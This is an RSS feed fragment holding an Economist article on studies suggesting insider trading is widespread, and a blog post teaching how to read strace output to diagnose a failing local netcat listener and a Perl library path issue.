<guid isPermaLink="true" >https://www.economist.com/news/finance-and-economics/21736561-one-study-suggests-insiders-profited-even-global-financial-crisis-another?frsc=dg%7Ce</guid>
<description>&lt;p&gt;INSIDER-TRADING prosecutions have netted plenty of small fry. But many grumble that the big fish swim off unharmed. That nagging fear has some new academic backing, from three studies. One argues that well-connected insiders profited even from the financial crisis.* The others go further still, suggesting the entire share-trading system is rigged.**&lt;/p&gt;
&lt;p&gt;What is known about insider trading tends to come from prosecutions. But these require fortuitous tip-offs and extensive, expensive investigations, involving the examination of complex evidence from phone calls, e-mails or informants wired with recorders. The resulting haze of numbers may befuddle a jury unless they are leavened with a few spicy details—exotic code words, say, or (even better) suitcases filled with cash.&lt;/p&gt;
&lt;div class=&quot;newsletter-form newsletter-form--inline&quot; readability=&quot;6&quot;&gt;
&lt;div class=&quot;newsletter-form__message&quot; readability=&quot;7&quot;&gt;&lt;strong&gt;Get our daily newsletter&lt;/strong&gt;
&lt;p&gt;Upgrade your inbox and get our Daily Dispatch and Editor's Picks.&lt;/p&gt;
&lt;/div&gt;

&lt;/div&gt;
&lt;div class=&quot;latest-updates-panel__container latest-updates-panel__container--blog-post&quot;&gt;

&lt;ul class=&quot;latest-updates-panel__body&quot;&gt;&lt;li class=&quot;latest-updates-panel-card__wrapper&quot; readability=&quot;-1.5&quot;&gt;
&lt;article class=&quot;latest-updates-panel__article-link&quot; readability=&quot;28&quot;&gt;
&lt;p&gt;
&lt;h3 class=&quot;latest-updates-panel-card__title&quot;&gt;After Brexit, which trade deals should negotiators prioritise?&lt;/h3&gt;
&lt;/p&gt;

&lt;/article&gt;&lt;/li&gt;
&lt;li class=&quot;latest-updates-panel-card__wrapper&quot; readability=&quot;-2&quot;&gt;
&lt;article class=&quot;latest-updates-panel__article-link&quot; readability=&quot;27&quot;&gt;
&lt;p&gt;
&lt;h3 class=&quot;latest-updates-panel-card__title&quot;&gt;German politics is in revolt against the “Merkel method”&lt;/h3&gt;
&lt;/p&gt;

&lt;/article&gt;&lt;/li&gt;
&lt;li class=&quot;latest-updates-panel-card__wrapper&quot; readability=&quot;-2&quot;&gt;
&lt;article class=&quot;latest-updates-panel__article-link&quot; readability=&quot;27&quot;&gt;
&lt;p&gt;
&lt;h3 class=&quot;latest-updates-panel-card__title&quot;&gt;The roots of hyperinflation&lt;/h3&gt;
&lt;/p&gt;

&lt;/article&gt;&lt;/li&gt;
&lt;li class=&quot;latest-updates-panel-card__wrapper&quot; readability=&quot;-2&quot;&gt;
&lt;article class=&quot;latest-updates-panel__article-link&quot; readability=&quot;27&quot;&gt;
&lt;p&gt;
&lt;h3 class=&quot;latest-updates-panel-card__title&quot;&gt;Israel launches airstrikes in Syria&lt;/h3&gt;
&lt;/p&gt;

&lt;/article&gt;&lt;/li&gt;
&lt;li class=&quot;latest-updates-panel-card__wrapper&quot; readability=&quot;-2&quot;&gt;
&lt;article class=&quot;latest-updates-panel__article-link&quot; readability=&quot;27&quot;&gt;
&lt;p&gt;
&lt;h3 class=&quot;latest-updates-panel-card__title&quot;&gt;When saintly commemorations turn sour&lt;/h3&gt;
&lt;/p&gt;

&lt;/article&gt;&lt;/li&gt;
&lt;li class=&quot;latest-updates-panel-card__wrapper&quot; readability=&quot;-2&quot;&gt;
&lt;article class=&quot;latest-updates-panel__article-link&quot; readability=&quot;27&quot;&gt;
&lt;p&gt;
&lt;h3 class=&quot;latest-updates-panel-card__title&quot;&gt;The Economist house-price indices&lt;/h3&gt;
&lt;/p&gt;

&lt;/article&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;

&lt;p&gt;The papers make imaginative use of pattern analysis from data to find that insider trading is probably pervasive. The approach reflects a new way of analysing conduct in the financial markets. It also raises questions about how to treat behaviour if it is systemic rather than limited to the occasional rogue trader.&lt;/p&gt;
&lt;p&gt;The first paper starts from the private meetings American government officials held during the crisis with financial institutions. Not made public at the time were critical details about what came to be called the Troubled Asset Relief Programme (TARP), notably how much money would be involved and how it would be allocated. This mattered hugely. The very survival of some institutions was at stake; in the end, hundreds of billions of dollars were pledged. Knowing the structure and scope of the bail-out in advance would have been a vitally important piece of information for investors during this period.&lt;/p&gt;
&lt;p&gt;The paper examines conduct at 497 financial institutions between 2005 and 2011, paying particular attention to individuals who had previously worked in the federal government, in institutions including the Federal Reserve. In the two years prior to the TARP, these people’s trading gave no evidence of unusual insight. But in the nine months after the TARP was announced, they achieved particularly good results. The paper concludes that “politically connected insiders had a significant information advantage during the crisis and traded to exploit this advantage.”&lt;/p&gt;
&lt;p&gt;The other papers use data from 1999 to 2014 from Abel Noser, a firm used by institutional investors to track trading transaction costs. The data covered 300 brokers but the papers focus on the 30 biggest, through which 80-85% of the trading volume flowed. They find evidence that large investors tend to trade more in periods ahead of important announcements, say, which is hard to explain unless they have access to unusually good information.&lt;/p&gt;
&lt;p&gt;They could acquire such information in several ways. The most innocent is that brokers “spread the news” of a particular client’s desire to buy or sell large amounts of shares in order to create a market, much as an auction house might do for a painting. But it is also possible, the papers suggest, that they give this information to favoured clients to boost their own business. Strengthening this argument is the finding that large asset managers which use their own affiliated brokers do not lose out.&lt;/p&gt;
&lt;p&gt;Large institutions can be both beneficiaries and victims of this sort of information leakage. But in general they are net gainers. The real losers, the papers conclude, are retail customers and smaller asset managers. Common to all the papers is the recognition that the public markets are, as conspiracy theorists have long argued, not truly public at all. Changing the law to fix that may not even be feasible. But at least, in large-scale data-crunching, a new type of corporate sleuth is on the case.&lt;/p&gt;
&lt;p&gt;&lt;sub&gt;* &quot;Political connections and the informativeness of insider trades&quot; by Alan D. Jagolinzer, Judge Business School, University of Cambridge; David F. Larcker, Graduate School of Business, Rock Center for Corporate Governance, Stanford University; Gaizka Ormazabal, IESE Business School, University of Navarra; Daniel J. Taylor, the Wharton School, University of Pennsylvania. Rock Center for Corporate Governance at Stanford University, Working Paper No. 222.&lt;/sub&gt;&lt;/p&gt;
&lt;p&gt;&lt;sub&gt;** &quot;Brokers and order flow leakage: evidence from fire sales&quot; by Andrea Barbon, Marco Di Maggio, Francesco Franzoni, Augustin Landler. National Bureau of Economist Research, Working Paper 24089, December, 2017; and &quot;The Relevance of Broker Networks for Information Diffusion in the Stock Market&quot; by Marco Di Maggio, Francesco Franzoni, Amir Kermani and Carlo Summavilla. NBER Working Paper, No 23522, June, 2017.&lt;/sub&gt;&lt;/p&gt;
</description>
<pubDate>Sun, 11 Feb 2018 16:29:10 +0000</pubDate>
<dc:creator>Bitcoin_McPonzi</dc:creator>
<og:description>One study suggests insiders profited even from the global financial crisis; another that the whole share-trading system is rigged</og:description>
<og:image>https://cdn.static-economist.com/sites/default/files/images/print-edition/20180210_FNP001_0.jpg</og:image>
<og:type>article</og:type>
<og:url>https://www.economist.com/news/finance-and-economics/21736561-one-study-suggests-insiders-profited-even-global-financial-crisis-another</og:url>
<og:title>Insider trading has been rife on Wall Street, academics conclude</og:title>
<dc:language>en</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.economist.com/news/finance-and-economics/21736561-one-study-suggests-insiders-profited-even-global-financial-crisis-another?frsc=dg%7Ce</dc:identifier>
</item>
<item>
<title>Strace – My Favourite Secret Weapon (2011)</title>
<link>https://zwischenzugs.com/2011/08/29/my-favourite-secret-weapon-strace/</link>
<guid isPermaLink="true" >https://zwischenzugs.com/2011/08/29/my-favourite-secret-weapon-strace/</guid>
<description>&lt;h2&gt;Why &lt;code&gt;strace&lt;/code&gt;?&lt;/h2&gt;
&lt;p&gt;I’m often asked in my technical troubleshooting job to solve problems that development teams can’t solve. Usually these do not involve knowledge of API calls or syntax, rather some kind of insight into what the right tool to use is, and why and how to use it. Probably because they’re not taught in college, developers are often unaware that these tools exist, which is a shame, as playing with them can give a much deeper understanding of what’s going on and ultimately lead to better code.&lt;/p&gt;
&lt;p&gt;My favourite secret weapon in this path to understanding is strace.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;strace&lt;/code&gt; (or its Solaris equivalents, &lt;code&gt;truss&lt;/code&gt;&lt;code&gt;dtruss&lt;/code&gt; is a tool that tells you which operating system (OS) calls your program is making.&lt;/p&gt;
&lt;p&gt;An OS call (or just “system call”) is your program asking the OS to provide some service for it. Since this covers a lot of the things that cause problems not directly to do with the domain of your application development (I/O, finding files, permissions etc) its use has a very high hit rate in resolving problems out of developers’ normal problem space.&lt;/p&gt;
&lt;h2&gt;Usage Patterns&lt;/h2&gt;
&lt;p&gt;strace is useful in all sorts of contexts. Here’s a couple of examples garnered from my experience.&lt;/p&gt;
&lt;h3&gt;My Netcat Server Won’t Start!&lt;/h3&gt;
&lt;p&gt;Imagine you’re trying to start an executable, but it’s failing silently (no log file, no output at all). You don’t have the source, and even if you did, the source code is neither readily available, nor ready to compile, nor readily comprehensible.&lt;/p&gt;
&lt;p&gt;Simply running through strace will likely give you clues as to what’s gone on.&lt;/p&gt;
&lt;pre&gt;
$  nc -l localhost 80
nc: Permission denied
&lt;/pre&gt;
&lt;p&gt;Let’s say someone’s trying to run this and doesn’t understand why it’s not working (let’s assume manuals are unavailable).&lt;/p&gt;
&lt;p&gt;Simply put &lt;code&gt;strace&lt;/code&gt; at the front of your command. Note that the following output has been heavily edited for space reasons (deep breath):&lt;/p&gt;
&lt;pre&gt;
 $ strace nc -l localhost 80
 execve(&quot;/bin/nc&quot;, [&quot;nc&quot;, &quot;-l&quot;, &quot;localhost&quot;, &quot;80&quot;], [/* 54 vars */]) = 0
 brk(0)                                  = 0x1e7a000
 access(&quot;/etc/ld.so.nohwcap&quot;, F_OK)      = -1 ENOENT (No such file or directory)
 mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f751c9c0000
 access(&quot;/etc/ld.so.preload&quot;, R_OK)      = -1 ENOENT (No such file or directory)
 open(&quot;/usr/local/lib/tls/x86_64/libglib-2.0.so.0&quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
 stat(&quot;/usr/local/lib/tls/x86_64&quot;, 0x7fff5686c240) = -1 ENOENT (No such file or directory)
 [...]
 open(&quot;libglib-2.0.so.0&quot;, O_RDONLY)      = -1 ENOENT (No such file or directory)
 open(&quot;/etc/ld.so.cache&quot;, O_RDONLY)      = 3
 fstat(3, {st_mode=S_IFREG|0644, st_size=179820, ...}) = 0
 mmap(NULL, 179820, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7f751c994000
 close(3)                                = 0
 access(&quot;/etc/ld.so.nohwcap&quot;, F_OK)      = -1 ENOENT (No such file or directory)
 open(&quot;/lib/x86_64-linux-gnu/libglib-2.0.so.0&quot;, O_RDONLY) = 3
 read(3, &quot;\177ELF\2\1\1\3&amp;gt;\1\320k\1&quot;..., 832) = 832
 fstat(3, {st_mode=S_IFREG|0644, st_size=975080, ...}) = 0
 mmap(NULL, 3072520, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7f751c4b3000
 mprotect(0x7f751c5a0000, 2093056, PROT_NONE) = 0
 mmap(0x7f751c79f000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0xec000) = 0x7f751c79f000
 mmap(0x7f751c7a1000, 520, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x7f751c7a1000
 close(3)                                = 0
 open(&quot;/usr/local/lib/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
[...]
 mmap(NULL, 179820, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7f751c994000
 close(3)                                = 0
 access(&quot;/etc/ld.so.nohwcap&quot;, F_OK)      = -1 ENOENT (No such file or directory)
 open(&quot;/lib/x86_64-linux-gnu/libnss_files.so.2&quot;, O_RDONLY) = 3
 read(3, &quot;\177ELF\2\1\1\3&amp;gt;\1\20\&quot;&quot;..., 832) = 832
 fstat(3, {st_mode=S_IFREG|0644, st_size=51728, ...}) = 0
 mmap(NULL, 2148104, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7f751b8b0000
 mprotect(0x7f751b8bc000, 2093056, PROT_NONE) = 0
 mmap(0x7f751babb000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0xb000) = 0x7f751babb000
 close(3)                                = 0
 mprotect(0x7f751babb000, 4096, PROT_READ) = 0
 munmap(0x7f751c994000, 179820)          = 0
 open(&quot;/etc/hosts&quot;, O_RDONLY|O_CLOEXEC)  = 3
 fcntl(3, F_GETFD)                       = 0x1 (flags FD_CLOEXEC)
 fstat(3, {st_mode=S_IFREG|0644, st_size=315, ...}) = 0
 mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f751c9bf000
 read(3, &quot;127.0.0.1\tlocalhost\n127.0.1.1\tal&quot;..., 4096) = 315
 read(3, &quot;&quot;, 4096)                       = 0
 close(3)                                = 0
 munmap(0x7f751c9bf000, 4096)            = 0
 open(&quot;/etc/gai.conf&quot;, O_RDONLY)         = 3
 fstat(3, {st_mode=S_IFREG|0644, st_size=3343, ...}) = 0
 fstat(3, {st_mode=S_IFREG|0644, st_size=3343, ...}) = 0
 mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f751c9bf000
 read(3, &quot;# Configuration for getaddrinfo(&quot;..., 4096) = 3343
 read(3, &quot;&quot;, 4096)                       = 0
 close(3)                                = 0
 munmap(0x7f751c9bf000, 4096)            = 0
 futex(0x7f751c4af460, FUTEX_WAKE_PRIVATE, 2147483647) = 0
 socket(PF_INET, SOCK_DGRAM, IPPROTO_IP) = 3
 connect(3, {sa_family=AF_INET, sin_port=htons(80), sin_addr=inet_addr(&quot;127.0.0.1&quot;)}, 16) = 0
 getsockname(3, {sa_family=AF_INET, sin_port=htons(58567), sin_addr=inet_addr(&quot;127.0.0.1&quot;)}, [16]) = 0
 close(3)                                = 0
 socket(PF_INET6, SOCK_DGRAM, IPPROTO_IP) = 3
 connect(3, {sa_family=AF_INET6, sin6_port=htons(80), inet_pton(AF_INET6, &quot;::1&quot;, &amp;amp;sin6_addr), sin6_flowinfo=0, sin6_scope_id=0}, 28) = 0
 getsockname(3, {sa_family=AF_INET6, sin6_port=htons(42803), inet_pton(AF_INET6, &quot;::1&quot;, &amp;amp;sin6_addr), sin6_flowinfo=0, sin6_scope_id=0}, [28]) = 0
 close(3)                                = 0
 socket(PF_INET6, SOCK_STREAM, IPPROTO_TCP) = 3
 setsockopt(3, SOL_SOCKET, SO_REUSEADDR, [1], 4) = 0
 bind(3, {sa_family=AF_INET6, sin6_port=htons(80), inet_pton(AF_INET6, &quot;::1&quot;, &amp;amp;sin6_addr), sin6_flowinfo=0, sin6_scope_id=0}, 28) = -1 EACCES (Permission denied)
 close(3)                                = 0
 socket(PF_INET, SOCK_STREAM, IPPROTO_TCP) = 3
 setsockopt(3, SOL_SOCKET, SO_REUSEADDR, [1], 4) = 0
 bind(3, {sa_family=AF_INET, sin_port=htons(80), sin_addr=inet_addr(&quot;127.0.0.1&quot;)}, 16) = -1 EACCES (Permission denied)
 close(3)                                = 0
 write(2, &quot;nc: &quot;, 4nc: )                     = 4
 write(2, &quot;Permission denied\n&quot;, 18Permission denied
 )     = 18
 exit_group(1)                           = ?
&lt;/pre&gt;
&lt;p&gt;To most people that see this flying up their terminal this initially looks like gobbledygook, but it’s really quite easy to parse when a few things are explained.&lt;/p&gt;
&lt;p&gt;For each line:&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;the first entry on the left is the system call being performed&lt;/li&gt;
&lt;li&gt;the bit in the parentheses are the arguments to the system call&lt;/li&gt;
&lt;li&gt;the right side of the equals sign is the return value of the system call&lt;/li&gt;
&lt;/ul&gt;&lt;pre&gt;
open(&quot;/etc/gai.conf&quot;, O_RDONLY)         = 3
&lt;/pre&gt;
&lt;p&gt;Therefore for this particular line, the system call is &lt;code&gt;open&lt;/code&gt;, the arguments are the string &lt;code&gt;/etc/gai.conf&lt;/code&gt; and the constant &lt;code&gt;O_RDONLY&lt;/code&gt;, and the return value was &lt;code&gt;3&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;How to make sense of this?&lt;/p&gt;
&lt;p&gt;Some of these system calls can be guessed or enough can be inferred from context. Most readers will figure out that the above line is the attempt to open a file with read-only permission.&lt;/p&gt;
&lt;p&gt;In the case of the above failure, we can see that before the program calls exit_group, there is a couple of calls to bind that return “Permission denied”:&lt;/p&gt;
&lt;pre&gt;
 bind(3, {sa_family=AF_INET6, sin6_port=htons(80), inet_pton(AF_INET6, &quot;::1&quot;, &amp;amp;sin6_addr), sin6_flowinfo=0, sin6_scope_id=0}, 28) = -1 EACCES (Permission denied)
 close(3)                                = 0
 socket(PF_INET, SOCK_STREAM, IPPROTO_TCP) = 3
 setsockopt(3, SOL_SOCKET, SO_REUSEADDR, [1], 4) = 0
 bind(3, {sa_family=AF_INET, sin_port=htons(80), sin_addr=inet_addr(&quot;127.0.0.1&quot;)}, 16) = -1 EACCES (Permission denied)
 close(3)                                = 0
 write(2, &quot;nc: &quot;, 4nc: )                     = 4
 write(2, &quot;Permission denied\n&quot;, 18Permission denied
 )     = 18
 exit_group(1)                           = ?
&lt;/pre&gt;
&lt;p&gt;We might therefore want to understand what “bind” is and why it might be failing.&lt;/p&gt;
&lt;p&gt;You need to get a copy of the system call’s documentation. On ubuntu and related distributions of linux, the documentation is in the &lt;code&gt;manpages-dev&lt;/code&gt; package, and can be invoked by eg ​​&lt;code&gt;man 2 bind&lt;/code&gt; (I just used &lt;code&gt;strace&lt;/code&gt; to determine which file &lt;code&gt;man 2 bind&lt;/code&gt; opened and then did a &lt;code&gt;dpkg -S&lt;/code&gt; to determine from which package it came!). You can also look up online if you have access, but if you can auto-install via a package manager you’re more likely to get docs that match your installation.&lt;/p&gt;
&lt;p&gt;Right there in my &lt;code&gt;man 2 bind&lt;/code&gt; page it says:&lt;/p&gt;
&lt;pre&gt;
ERRORS
 EACCES The address is protected, and the user is not the superuser.
&lt;/pre&gt;
&lt;p&gt;So there is the answer – we’re trying to bind to a port that can only be bound to if you are the super-user.&lt;/p&gt;
&lt;hr/&gt;&lt;p&gt;&lt;strong&gt;My book, &lt;a href=&quot;https://leanpub.com/learnbashthehardway&quot;&gt;Learn Bash the Hard Way&lt;/a&gt;, available at &lt;a href=&quot;https://leanpub.com/learnbashthehardway&quot;&gt;$5&lt;/a&gt;:&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://leanpub.com/learnbashthehardway&quot;&gt;&lt;img data-attachment-id=&quot;4192&quot; data-permalink=&quot;https://zwischenzugs.com/2018/01/06/ten-things-i-wish-id-known-about-bash/hero/&quot; data-orig-file=&quot;https://zwischenzugs.files.wordpress.com/2018/01/hero.png&quot; data-orig-size=&quot;600,957&quot; data-comments-opened=&quot;1&quot; data-image-meta=&quot;{&amp;quot;aperture&amp;quot;:&amp;quot;0&amp;quot;,&amp;quot;credit&amp;quot;:&amp;quot;&amp;quot;,&amp;quot;camera&amp;quot;:&amp;quot;&amp;quot;,&amp;quot;caption&amp;quot;:&amp;quot;&amp;quot;,&amp;quot;created_timestamp&amp;quot;:&amp;quot;0&amp;quot;,&amp;quot;copyright&amp;quot;:&amp;quot;&amp;quot;,&amp;quot;focal_length&amp;quot;:&amp;quot;0&amp;quot;,&amp;quot;iso&amp;quot;:&amp;quot;0&amp;quot;,&amp;quot;shutter_speed&amp;quot;:&amp;quot;0&amp;quot;,&amp;quot;title&amp;quot;:&amp;quot;&amp;quot;,&amp;quot;orientation&amp;quot;:&amp;quot;0&amp;quot;}&quot; data-image-title=&quot;hero&quot; data-image-description=&quot;&quot; data-medium-file=&quot;https://zwischenzugs.files.wordpress.com/2018/01/hero.png?w=188&amp;amp;h=300&quot; data-large-file=&quot;https://zwischenzugs.files.wordpress.com/2018/01/hero.png?w=600&quot; class=&quot;alignnone size-medium wp-image-4192&quot; src=&quot;https://zwischenzugs.files.wordpress.com/2018/01/hero.png?w=188&amp;amp;h=300&quot; alt=&quot;hero&quot; width=&quot;188&quot; height=&quot;300&quot; srcset=&quot;https://zwischenzugs.files.wordpress.com/2018/01/hero.png?w=188&amp;amp;h=300 188w, https://zwischenzugs.files.wordpress.com/2018/01/hero.png?w=376&amp;amp;h=600 376w, https://zwischenzugs.files.wordpress.com/2018/01/hero.png?w=94&amp;amp;h=150 94w&quot; sizes=&quot;(max-width: 188px) 85vw, 188px&quot;/&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Preview available &lt;a title=&quot;learnbashthehardway-sample-preview&quot; href=&quot;https://zwischenzugs.files.wordpress.com/2018/01/learnbashthehardway-sample-preview.pdf&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;hr/&gt;&lt;h3&gt;My Library Is Not Loading!&lt;/h3&gt;
&lt;p&gt;Imagine a situation where developer A’s perl script is working fine, but not on developer B’s identical one is not (again, the output has been edited).&lt;br/&gt;In this case, we strace the output on developer B’s computer to see how it’s working:&lt;/p&gt;
&lt;pre&gt;
$ strace perl a.pl
execve(&quot;/usr/bin/perl&quot;, [&quot;perl&quot;, &quot;a.pl&quot;], [/* 57 vars */]) = 0
brk(0)                                  = 0xa8f000
[...]fcntl(3, F_SETFD, FD_CLOEXEC)           = 0
fstat(3, {st_mode=S_IFREG|0664, st_size=14, ...}) = 0
rt_sigaction(SIGCHLD, NULL, {SIG_DFL, [], 0}, 8) = 0
brk(0xad1000)                           = 0xad1000
read(3, &quot;use blahlib;\n\n&quot;, 4096)       = 14
stat(&quot;/space/myperllib/blahlib.pmc&quot;, 0x7fffbaf7f3d0) = -1 ENOENT (No such file or directory)
stat(&quot;/space/myperllib/blahlib.pm&quot;, {st_mode=S_IFREG|0644, st_size=7692, ...}) = 0
open(&quot;/space/myperllib/blahlib.pm&quot;, O_RDONLY) = 4
ioctl(4, SNDCTL_TMR_TIMEBASE or TCGETS, 0x7fffbaf7f090) = -1 ENOTTY (Inappropriate ioctl for device)
[...]mmap(0x7f4c45ea8000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 5, 0x4000) = 0x7f4c45ea8000
close(5)                                = 0
mprotect(0x7f4c45ea8000, 4096, PROT_READ) = 0
brk(0xb55000)                           = 0xb55000
read(4, &quot;swrite($_[0], $_[1], $_[2], $_[3&quot;..., 4096) = 3596
brk(0xb77000)                           = 0xb77000
read(4, &quot;&quot;, 4096)                       = 0
close(4)                                = 0
read(3, &quot;&quot;, 4096)                       = 0
close(3)                                = 0
exit_group(0)                           = ?
&lt;/pre&gt;
&lt;p&gt;We observe that the file is found in what looks like an unusual place.&lt;/p&gt;
&lt;pre&gt;
open(&quot;/space/myperllib/blahlib.pm&quot;, O_RDONLY) = 4
&lt;/pre&gt;
&lt;p&gt;Inspecting the environment, we see that:&lt;/p&gt;
&lt;pre&gt;
$ env | grep myperl
PERL5LIB=/space/myperllib
&lt;/pre&gt;
&lt;p&gt;So the solution is to set the same env variable before running:&lt;/p&gt;
&lt;pre&gt;
export PERL5LIB=/space/myperllib
&lt;/pre&gt;
&lt;h2&gt;Get to know the internals bit by bit&lt;/h2&gt;
&lt;p&gt;If you do this a lot, or idly run &lt;code&gt;strace&lt;/code&gt; on various commands and peruse the output, you can learn all sorts of things about the internals of your OS. If you’re like me, this is a great way to learn how things work. For example, just now I’ve had a look at the file &lt;code&gt;/etc/gai.conf&lt;/code&gt;, which I’d never come across before writing this.&lt;/p&gt;
&lt;p&gt;Once your interest has been piqued, I recommend getting a copy of “Advanced Programming in the Unix Environment” by Stevens &amp;amp; Rago, and reading it cover to cover. Not all of it will go in, but as you use &lt;code&gt;strace&lt;/code&gt; more and more, and (hopefully) browse C code more and more understanding will grow.&lt;/p&gt;
&lt;h2&gt;Gotchas&lt;/h2&gt;
&lt;p&gt;If you’re running a program that calls other programs, it’s important to run with the -f flag, which “follows” child processes and straces them. -ff creates a separate file with the pid suffixed to the name.&lt;/p&gt;
&lt;p&gt;If you’re on solaris, this program doesn’t exist – you need to use truss instead.&lt;/p&gt;
&lt;p&gt;Many production environments will not have this program installed for security reasons. strace doesn’t have many library dependencies (on my machine it has the same dependencies as ‘echo’), so if you have permission, (or are feeling sneaky) you can just copy the executable up.&lt;/p&gt;
&lt;h2&gt;Other useful tidbits&lt;/h2&gt;
&lt;p&gt;You can attach to running processes (can be handy if your program appears to hang or the issue is not readily reproducible) with &lt;code&gt;-p&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;If you’re looking at performance issues, then the time flags (&lt;code&gt;-t&lt;/code&gt;, &lt;code&gt;-tt&lt;/code&gt;, &lt;code&gt;-ttt&lt;/code&gt;, and &lt;code&gt;-T&lt;/code&gt;) can help significantly.&lt;/p&gt;

&lt;hr/&gt;&lt;p&gt;&lt;strong&gt;My book, &lt;a href=&quot;https://leanpub.com/learnbashthehardway&quot;&gt;Learn Bash the Hard Way&lt;/a&gt;, available at &lt;a href=&quot;https://leanpub.com/learnbashthehardway&quot;&gt;$5&lt;/a&gt;:&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://leanpub.com/learnbashthehardway&quot;&gt;&lt;img data-attachment-id=&quot;4192&quot; data-permalink=&quot;https://zwischenzugs.com/2018/01/06/ten-things-i-wish-id-known-about-bash/hero/&quot; data-orig-file=&quot;https://zwischenzugs.files.wordpress.com/2018/01/hero.png&quot; data-orig-size=&quot;600,957&quot; data-comments-opened=&quot;1&quot; data-image-meta=&quot;{&amp;quot;aperture&amp;quot;:&amp;quot;0&amp;quot;,&amp;quot;credit&amp;quot;:&amp;quot;&amp;quot;,&amp;quot;camera&amp;quot;:&amp;quot;&amp;quot;,&amp;quot;caption&amp;quot;:&amp;quot;&amp;quot;,&amp;quot;created_timestamp&amp;quot;:&amp;quot;0&amp;quot;,&amp;quot;copyright&amp;quot;:&amp;quot;&amp;quot;,&amp;quot;focal_length&amp;quot;:&amp;quot;0&amp;quot;,&amp;quot;iso&amp;quot;:&amp;quot;0&amp;quot;,&amp;quot;shutter_speed&amp;quot;:&amp;quot;0&amp;quot;,&amp;quot;title&amp;quot;:&amp;quot;&amp;quot;,&amp;quot;orientation&amp;quot;:&amp;quot;0&amp;quot;}&quot; data-image-title=&quot;hero&quot; data-image-description=&quot;&quot; data-medium-file=&quot;https://zwischenzugs.files.wordpress.com/2018/01/hero.png?w=188&amp;amp;h=300&quot; data-large-file=&quot;https://zwischenzugs.files.wordpress.com/2018/01/hero.png?w=600&quot; class=&quot;alignnone size-medium wp-image-4192&quot; src=&quot;https://zwischenzugs.files.wordpress.com/2018/01/hero.png?w=188&amp;amp;h=300&quot; alt=&quot;hero&quot; width=&quot;188&quot; height=&quot;300&quot; srcset=&quot;https://zwischenzugs.files.wordpress.com/2018/01/hero.png?w=188&amp;amp;h=300 188w, https://zwischenzugs.files.wordpress.com/2018/01/hero.png?w=376&amp;amp;h=600 376w, https://zwischenzugs.files.wordpress.com/2018/01/hero.png?w=94&amp;amp;h=150 94w&quot; sizes=&quot;(max-width: 188px) 85vw, 188px&quot;/&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Preview available &lt;a title=&quot;learnbashthehardway-sample-preview&quot; href=&quot;https://zwischenzugs.files.wordpress.com/2018/01/learnbashthehardway-sample-preview.pdf&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;div class=&quot;wpcnt&quot;&gt;
&lt;div class=&quot;wpa wpmrec&quot;&gt;&lt;span class=&quot;wpa-about&quot;&gt;Advertisements&lt;/span&gt;



&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;jp-post-flair&quot; class=&quot;sharedaddy sd-like-enabled sd-sharing-enabled&quot;&gt;
&lt;div class=&quot;sharedaddy sd-sharing-enabled&quot;&gt;
&lt;div class=&quot;robots-nocontent sd-block sd-social sd-social-official sd-sharing&quot;&gt;
&lt;h3 class=&quot;sd-title&quot;&gt;Share this:&lt;/h3&gt;

&lt;/div&gt;
&lt;/div&gt;
&lt;div class=&quot;sharedaddy sd-block sd-like jetpack-likes-widget-wrapper jetpack-likes-widget-unloaded&quot; id=&quot;like-post-wrapper-20870870-60-5a81b9cf3e2b9&quot; data-src=&quot;//widgets.wp.com/likes/index.html?ver=20180207#blog_id=20870870&amp;amp;post_id=60&amp;amp;origin=zwischenzugs.wordpress.com&amp;amp;obj_id=20870870-60-5a81b9cf3e2b9&quot; data-name=&quot;like-post-frame-20870870-60-5a81b9cf3e2b9&quot;&gt;
&lt;h3 class=&quot;sd-title&quot;&gt;Like this:&lt;/h3&gt;
&lt;div class=&quot;likes-widget-placeholder post-likes-widget-placeholder&quot;&gt;&lt;span class=&quot;button&quot;&gt;&lt;span&gt;Like&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;loading&quot;&gt;Loading...&lt;/span&gt;&lt;/div&gt;
&lt;/div&gt;

&lt;/div&gt;
</description>
<pubDate>Sun, 11 Feb 2018 15:31:41 +0000</pubDate>
<dc:creator>zwischenzug</dc:creator>
<og:type>article</og:type>
<og:title>My Favourite Secret Weapon – strace</og:title>
<og:url>https://zwischenzugs.com/2011/08/29/my-favourite-secret-weapon-strace/</og:url>
<og:description>Why strace? I’m often asked in my technical troubleshooting job to solve problems that development teams can’t solve. Usually these do not involve knowledge of API calls or syntax, rath…</og:description>
<og:image>https://zwischenzugs.files.wordpress.com/2018/01/hero.png?w=188</og:image>
<dc:language>en</dc:language>
<dc:format>text/html</dc:format>
